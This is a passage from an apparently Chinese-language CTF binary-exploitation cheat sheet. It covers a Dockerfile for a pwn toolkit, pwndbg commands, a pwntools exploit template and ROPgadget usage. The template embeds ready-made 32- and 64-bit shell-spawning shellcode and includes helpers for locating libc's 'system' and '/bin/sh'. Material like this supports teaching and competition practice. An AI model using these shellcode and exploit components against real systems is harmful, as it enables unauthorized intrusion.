class="language-bash">    file \</span></span><br><span class="line"><span class="language-bash">    tree \</span></span><br><span class="line"><span class="language-bash">    bison --fix-missing &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">rm</span> -rf /var/lib/apt/list/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip2 install --upgrade pip setuptools &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    pip2 install pathlib2 pwntools --no-cache-dir &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    pip3 install --upgrade pip setuptools &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    pip3 install --no-cache-dir --default-timeout=100 \</span></span><br><span class="line"><span class="language-bash">    ropgadget \</span></span><br><span class="line"><span class="language-bash">    pwntools \</span></span><br><span class="line"><span class="language-bash">    z3-solver \</span></span><br><span class="line"><span class="language-bash">    smmap2 \</span></span><br><span class="line"><span class="language-bash">    apscheduler \</span></span><br><span class="line"><span class="language-bash">    ropper \</span></span><br><span class="line"><span class="language-bash">    unicorn \</span></span><br><span class="line"><span class="language-bash">    keystone-engine \</span></span><br><span class="line"><span class="language-bash">    capstone \</span></span><br><span class="line"><span class="language-bash">    angr \</span></span><br><span class="line"><span class="language-bash">    pebble</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    gem install one_gadget seccomp-tools zsteg &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/gems/2.*/cache/* </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/pwndbg/pwndbg ~/pwndbg &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cd</span> ~/pwndbg &amp;&amp; <span class="built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cd</span> ~/Pwngdb &amp;&amp; <span class="built_in">cat</span> ~/Pwngdb/.gdbinit  &gt;&gt; ~/.gdbinit &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot;</span> ~/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/niklasb/libc-database.git ~/libc-database &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&quot;~/libc-database/&quot;</span> &gt; ~/.libcdb_path</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/matrix1001/glibc-all-in-one ~/glibc-all-in-one </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> chsh -s $(<span class="built_in">which</span> zsh) &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git <span class="built_in">clone</span> https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s/plugins=(git)/plugins=(git zsh-syntax-highlighting zsh-autosuggestions)/g&#x27;</span> ~/.zshrc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y locales &amp;&amp; locale-gen en_US &amp;&amp; locale-gen en_US.UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG=en_US.UTF-<span class="number">8</span>  </span><br><span class="line"><span class="keyword">ENV</span> LANGUAGE=en_US:en  </span><br><span class="line"><span class="keyword">ENV</span> LC_ALL=en_US.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>最常用的逆向工具，可以很方便的将汇编代码反编译为便于人类可读的伪代码。</p><h2 id="GDB-pwndbg"><a href="#GDB-pwndbg" class="headerlink" title="GDB/pwndbg"></a>GDB/pwndbg</h2><p>gdb 为 linux 自带的程序调试工具，但是原生的 gdb 非常难用，因此可以安装 pwndbg 插件增强 gdb 的功能，安装方法如下所示，在前文的 dockerfile 中集成了 pwndbg。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>pwndbd 文档为<a href="https://browserpwndbg.readthedocs.io/en/docs/">https://browserpwndbg.readthedocs.io/en/docs/</a>。常用的 pwndbg 命令如下。</p><table><thead><tr><th align="center">命令</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">set args xxxx xxxx</td><td align="center">设置程序的 args 为 xxxx 和 xxxx</td></tr><tr><td align="center">vmmap</td><td align="center">查看程序的所有地址</td></tr><tr><td align="center">run</td><td align="center">直接执行程序</td></tr><tr><td align="center">start</td><td align="center">从头开始执行程序，相当于在第一行代码处下断点并且开始执行，通常这不会从 main 函数开始执行，而是 libc 中的 start</td></tr><tr><td align="center">b *0xxxxxxxx</td><td align="center">在地址 0xxxxxxxx 处下断点</td></tr><tr><td align="center">b main</td><td align="center">在 main 函数的开始处下断点</td></tr><tr><td align="center">b func+10</td><td align="center">在 func+10 处下断点</td></tr><tr><td align="center">b func+10 if i == 1</td><td align="center">条件断点，gdb 必须可以找到变量 i</td></tr><tr><td align="center">d breakpoints</td><td align="center">删除所有断点</td></tr><tr><td align="center">d breakpoints 1</td><td align="center">删除编号为 1 的断点</td></tr><tr><td align="center">i breakpoints</td><td align="center">查看所有断点</td></tr><tr><td align="center">i functions</td><td align="center">查看程序目前所有的函数名称与地址</td></tr><tr><td align="center">attach 123</td><td align="center">挂载到进程号 123 的程序，通常和 pwntools 配合使用</td></tr><tr><td align="center">stack</td><td align="center">查看栈上的东西</td></tr><tr><td align="center">regs</td><td align="center">查看目前所有寄存器的值</td></tr><tr><td align="center">got</td><td align="center">查看 got 表的信息</td></tr><tr><td align="center">plt</td><td align="center">查看 plt 表的信息</td></tr><tr><td align="center">heap</td><td align="center">查看堆上的 chunk</td></tr><tr><td align="center">heap_info</td><td align="center">查看 heap_info 的信息</td></tr><tr><td align="center">arena</td><td align="center">查看所有 arena 的信息</td></tr><tr><td align="center">bins</td><td align="center">查看所有 bin 的信息</td></tr><tr><td align="center">tcache</td><td align="center">查看 tcache 的信息</td></tr><tr><td align="center">fastbins</td><td align="center">查看 fastbins 所有的 chunk</td></tr><tr><td align="center">smallbins</td><td align="center">查看 smallbins 所有的 chunk</td></tr><tr><td align="center">largebins</td><td align="center">查看 largebins 所有的 chunk</td></tr><tr><td align="center">unsortedbin</td><td align="center">查看 unsortedbin 的所有 chunk</td></tr><tr><td align="center">top_chunk</td><td align="center">查看 top chunk 的信息</td></tr><tr><td align="center">x/20xw 0xxxxx</td><td align="center">以十六进制，4 字节为单位打印 20 个该地址保存的值，32 位程序常用</td></tr><tr><td align="center">x/20xh 0xxxxx</td><td align="center">以十六进制，2 字节为单位打印 20 个该地址保存的值</td></tr><tr><td align="center">x/20xg 0xxxxx</td><td align="center">以十六进制，8 字节为单位打印 20 个该地址保存的值，64 位程序常用</td></tr><tr><td align="center">x/20i 0xxxxx</td><td align="center">将该地址保存的值解析为指令打印 20 条</td></tr><tr><td align="center">x/20s 0xxxxx</td><td align="center">将改地址保存的值解析为字符串打印 20 个</td></tr><tr><td align="center">rop</td><td align="center">等同用使用 ropgadget</td></tr><tr><td align="center">ropper</td><td align="center">等同于使用 ropper</td></tr><tr><td align="center">checksec</td><td align="center">等同于使用 checksec，该命令来自 pwntools</td></tr><tr><td align="center">canary</td><td align="center">打印当前栈上的 canary</td></tr><tr><td align="center">retaddr</td><td align="center">打印当前站上的 ret 地址</td></tr><tr><td align="center">distance 0xxxxx 0xxxxx</td><td align="center">计算两个地址之间的距离</td></tr><tr><td align="center">cyclic 10</td><td align="center">生成 10 个字节 junk data，生成的 junk data 是有规律的，例如 aaabaaacaaad 等等，该命令来自 pwntools</td></tr></tbody></table><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>是一个专门为 pwn 而生的 python 库，其中集成了很多非常友好的 pwn 相关的 API 以及利用方法，很多手工利用很复杂的方法在 pwntools 中只需要一个函数就可以。</p><p>安装 pwntools。在前文的 dockerfile 中集成了 python2 和 python3 的 pwntools。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python2 -m pip install --upgrade pip==20.3.4</span><br><span class="line">python2 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>下面是一个比较常用的 pwntools 脚本框架。若该脚本接收了参数，则会启动远程连接，否则仅为本地测试。可以根据 <code>context.clear(arch=&#39;amd64&#39;)</code> 来指定程序是否为 64 位，根据 <code>context.update(log_level=&#39;debug&#39;)</code> 来指定是否开启 debug 模式，根据 <code>libc = ELF(&#39;./libc6_2.27-3ubuntu1.2_amd64.so&#39;)</code> 来指定需要使用的 libc 文件，此外，pg 是一个 payload 生成器，也就是 cyclic，例如 <code>pg.get(8)</code> 会得到字符串<code>aaaaaaab</code>。debug 函数主要用来暂停程序，在本地测试的时候可以 attach 到 gdb，但是前提是需要在 tmux 里运行 exp。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> abspath</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>:</span><br><span class="line">    host = <span class="string">&#x27;1.2.3.4&#x27;</span></span><br><span class="line">    port = <span class="number">1234</span></span><br><span class="line">    elf = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># libc = &#x27;./libc.so&#x27;</span></span><br><span class="line">    <span class="comment"># Enable amd64.</span></span><br><span class="line">    x86_64 = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># To enbale debug mode, by using &quot;python exp.py d&quot;.</span></span><br><span class="line">    debug_mode = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># To enbale remote mode, by using &quot;python exp.py r&quot;.</span></span><br><span class="line">    remote_mode = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">            debug_mode = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;r&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">            remote_mode = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug_mode:</span><br><span class="line">        context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x86_64:</span><br><span class="line">        context.update(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pwn</span>:</span><br><span class="line">    proc_base = libc_base = bin_sh = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 25 bytes.</span></span><br><span class="line">    shellcode32 = <span class="string">&#x27;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">    <span class="comment"># 24 bytes.</span></span><br><span class="line">    shellcode64 = <span class="string">&#x27;\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">    pg = cyclic_gen()</span><br><span class="line">    libc = <span class="literal">None</span></span><br><span class="line">    elf = ELF(Config.elf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Config.libc:</span><br><span class="line">        libc = ELF(Config.libc)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>):</span><br><span class="line">            bin_sh = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span>, p=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> Config.debug_mode:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> Config.remote_mode:</span><br><span class="line">                gdb.attach(conn, cmd)</span><br><span class="line">        <span class="keyword">if</span> p:</span><br><span class="line">            pause()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_conn</span>():</span><br><span class="line">        <span class="keyword">if</span> Config.remote_mode:</span><br><span class="line">            conn = remote(Config.host, Config.port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = process(</span><br><span class="line">                Pwn.elf.path, env=&#123;</span><br><span class="line">                    <span class="string">&#x27;LD_PRELOAD&#x27;</span>: Pwn.libc.path <span class="keyword">if</span> Config.libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            Pwn.proc_base = conn.libs()[abspath(Pwn.elf.path)]</span><br><span class="line">            log.info(<span class="string">&#x27;Process base address: %s&#x27;</span> % <span class="built_in">hex</span>(Pwn.proc_base))</span><br><span class="line">            <span class="keyword">if</span> Pwn.libc:</span><br><span class="line">                Pwn.libc_base = conn.libs()[abspath(Pwn.libc.path)]</span><br><span class="line">                log.info(<span class="string">&#x27;Libc base address: %s&#x27;</span> % <span class="built_in">hex</span>(Pwn.libc_base))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn</span><br><span class="line"><span class="comment"># Debug funciton. Access 2 parameters, the first is gdb script and</span></span><br><span class="line"><span class="comment"># second is a bool to enable pause process after gdb attached.</span></span><br><span class="line">d = Pwn.debug</span><br><span class="line"><span class="comment"># Get a pwn connection, including local and remote.</span></span><br><span class="line">get_conn = Pwn.get_conn</span><br><span class="line"></span><br><span class="line"><span class="comment"># The pwn connection.</span></span><br><span class="line">conn = get_conn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload generator, generate string like &quot;aaaabaaacaaa&quot;...</span></span><br><span class="line">pg = Pwn.pg</span><br><span class="line"><span class="comment"># The ELF file.</span></span><br><span class="line">elf = Pwn.elf</span><br><span class="line"><span class="comment"># The libc file.</span></span><br><span class="line">libc = Pwn.libc</span><br><span class="line"><span class="comment"># Process base address. It is very usable if enable PIE.</span></span><br><span class="line">proc_base = Pwn.proc_base</span><br><span class="line"><span class="comment"># Libc base address. Only availbale with local libc, for checking leaked libc address.</span></span><br><span class="line">libc_base = Pwn.libc_base</span><br><span class="line"><span class="comment"># The &quot;/bin/sh&quot; offset address in libc.</span></span><br><span class="line">bin_sh = Pwn.bin_sh</span><br><span class="line"><span class="comment"># A standard 25 bytes x86 shellcode.</span></span><br><span class="line">shellcode32 = Pwn.shellcode32</span><br><span class="line"><span class="comment"># Astandard 24 bytes x86-64 shellcode.</span></span><br><span class="line">shellcode64 = Pwn.shellcode64</span><br><span class="line"><span class="comment"># -------------------------=[Write your pwn code here]=-------------------------</span></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一些常用的 pwntools 功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pause()  <span class="comment"># 暂停程序执行，在 send 数据之前暂停才有效，通常用来暂停程序执行等到用 gdb 进行 attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send and recv.</span></span><br><span class="line">conn.sendline(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">line = conn.recvline()</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;Name : &#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">data = conn.recvall()</span><br><span class="line">data = conn.recv(<span class="number">10</span>)  <span class="comment"># recv 10 bytes data.</span></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Name : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Auto create a new window and attach to gdb</span></span><br><span class="line">gdb.attach(conn)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x800000</span>)  <span class="comment"># 64-bits int to string, return 8 bytes string.</span></span><br><span class="line">payload = p32(<span class="number">0x800000</span>)  <span class="comment"># 32-bits int to string, return 4 bytes string.</span></span><br><span class="line">data = u64(<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 64-bits string to int.</span></span><br><span class="line">data = u32(<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 32-bits string to int.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write asm.</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax,1;</span></span><br><span class="line"><span class="string">push eax;</span></span><br><span class="line"><span class="string">pop eax;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">conn.send(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get libc offset.</span></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># Get address of the string /bin/sh&quot; from libc.</span></span><br><span class="line">str_bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get plt or got address of a function.</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>用来对一个二进制程序进行安全检查，检查是否开启常用的安全措施，实际上该程序是一个属于 pwntools 的 python 脚本。</p><p><img src="/2021/08/14/StackOverflow-CheatSheet/9.png"></p><h2 id="asm-online"><a href="#asm-online" class="headerlink" title="asm online"></a>asm online</h2><p>一个可以在线编写汇编并且编译为 hex 字符串的 <a href="https://defuse.ca/online-x86-assembler.htm#disassembly"> 网站</a>，支持 x86 与 x64，很方便编写和检查 shellcode，不过 pwntools 中集成了便携 asm 的 api。</p><h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc-database"></a>libc-database</h2><p>一个可以根据程序泄漏出的 libc 函数地址与函数名查询 libc 版本的 <a href="https://libc.rip/"> 在线网站 </a>。同时，<a href="https://github.com/niklasb/libc-database">libc-database</a> 还是一个离线数据库，包含了几乎所有的 libc 版本，并且提供了方便的查询接口，但是该离线数据库非常大。以及 <a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a> 也是一个具有同样功能的离线数据库。</p><p>安装 libc-database，用 get 就可以自动下载所有的 ubuntu 的 libc 数据库到 db 目录下，通过 find 就可以直接根据函数名和后三个 16 进制的偏移识别对应的 libc。前文中的 dockerfile 集成了 libc-database，但是没有下载任何数据库，下载的 libc 数据库通常会达到好几个 g。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line">./get</span><br><span class="line">./find <span class="built_in">printf</span> 260 puts f30</span><br></pre></td></tr></table></figure><h2 id="ROPgadgets"><a href="#ROPgadgets" class="headerlink" title="ROPgadgets"></a>ROPgadgets</h2><p>检查一个 elf 文件中的所有 gadgets，包括 rop，jop 以及 cop 的 gadgets。安装 ropgadgets，在前文的 dockerfile 中集成了 ropgadgets。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">pip install ropgadget</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                    [--dump] [--silent] [--align ALIGN]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">    -h, --help           show this help message and exit</span><br><span class="line">    -v, --version        Display the ROPgadget&#x27;s version</span><br><span class="line">    -c, --checkUpdate    Checks if a new version is available</span><br><span class="line">    --binary &lt;binary&gt;    Specify a binary filename to analyze</span><br><span class="line">    --opcode &lt;opcodes&gt;   Search opcode in executable segment</span><br><span class="line">    --string &lt;string&gt;    Search string in readable segment</span><br><span class="line">    --memstr &lt;string&gt;    Search each byte in all readable segment</span><br><span class="line">    --depth &lt;nbyte&gt;      Depth for search engine (default 10)</span><br><span class="line">    --only &lt;key&gt;         Only show specific instructions</span><br><span class="line">    --filter &lt;key&gt;       Suppress specific mnemonics</span><br><span class="line">    --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)</span><br><span class="line">    --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget&#x27;s address</span><br><span class="line">    --rawArch &lt;arch&gt;     Specify an arch for a raw file</span><br><span class="line">    --rawMode &lt;mode&gt;     Specify a mode for a raw file</span><br><span class="line">    --rawEndian &lt;endian&gt; Specify an endianness for a raw file</span><br><span class="line">    --re &lt;re&gt;            Regular expression</span><br><span class="line">    --offset &lt;hexaddr&gt;   Specify an offset for gadget addresses</span><br><span class="line">    --ropchain           Enable the ROP chain generation</span><br><span class="line">    --thumb              Use the thumb mode for the search engine (ARM only)</span><br><span class="line">    --console            Use an interactive console for search engine</span><br><span class="line">    --norop              Disable ROP search engine</span><br><span class="line">    --nojop              Disable JOP search engine</span><br><span class="line">    --callPreceded       Only show gadgets which are call-preceded</span><br><span class="line">    --nosys              Disable SYS search engine</span><br><span class="line">    --multibr            Enable multiple branch gadgets</span><br><span class="line">    --all                Disables the removal of duplicate gadgets</span><br><span class="line">    --noinstr            Disable the gadget 